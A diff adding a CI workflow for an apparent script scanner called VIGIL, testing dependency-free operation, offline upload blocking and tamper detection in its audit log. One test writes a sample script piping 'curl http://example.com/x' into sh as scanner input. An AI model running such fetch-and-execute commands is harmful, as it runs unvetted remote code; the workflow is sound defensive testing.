@@ -1,0 +1,100 @@
+name: tests
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  test:
+    name: pytest (${{ matrix.os }}, py${{ matrix.python-version }})
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        python-version: ["3.10", "3.11", "3.12", "3.13"]
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python-version }}
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements.txt
+
+      - name: Run test suite
+        run: python -m pytest -q
+
+  zero-dependency:
+    name: runs on the standard library alone
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      # VIGIL claims it runs with zero configuration and no optional extras,
+      # degrading gracefully. This job proves it: pytest only, nothing else.
+      - name: Install pytest only
+        run: |
+          python -m pip install --upgrade pip
+          pip install "pytest>=8.0"
+
+      - name: Test suite passes without PyYAML, yara-python, or anthropic
+        run: python -m pytest -q
+
+      - name: Scan a benign script with no optional dependencies
+        run: |
+          printf '#!/bin/bash\necho hello\n' > benign.sh
+          python -m vigil scan benign.sh --no-color
+
+      - name: Offline mode blocks upload even when --upload is passed
+        run: |
+          printf '#!/bin/bash\ncurl http://example.com/x | sh\n' > sus.sh
+          python -m vigil scan sus.sh --no-color --offline --upload --json > out.json || true
+          python - <<'PY'
+          import json
+          r = json.load(open("out.json"))
+          notes = " ".join(r.get("notes", []))
+          assert "offline mode" in notes, notes
+          assert r["verdict"]["explanation_source"] == "template", r["verdict"]
+          print("offline enforcement verified")
+          PY
+
+  audit-integrity:
+    name: audit log chain is tamper-evident
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - run: pip install "pytest>=8.0"
+
+      - name: Write, verify, tamper, and confirm detection
+        run: |
+          printf '#!/bin/bash\necho hi\n' > a.sh
+          python -m vigil scan a.sh --no-color --offline --audit-log audit.jsonl || true
+          python -m vigil scan a.sh --no-color --offline --no-cache --audit-log audit.jsonl || true
+          python -m vigil verify-audit audit.jsonl
+          python - <<'PY'
+          import json
+          lines = open("audit.jsonl").read().splitlines()
+          rec = json.loads(lines[0]); rec["verdict"]["band"] = "SAFE"
+          lines[0] = json.dumps(rec)
+          open("audit.jsonl", "w").write("\n".join(lines) + "\n")
+          PY
+          if python -m vigil verify-audit audit.jsonl; then
+            echo "FAIL: tampering was not detected"; exit 1
+          else
+            echo "tampering correctly detected"
+          fi
